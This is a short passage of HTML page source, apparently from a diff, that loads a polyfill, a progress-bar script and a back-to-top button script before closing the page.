src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
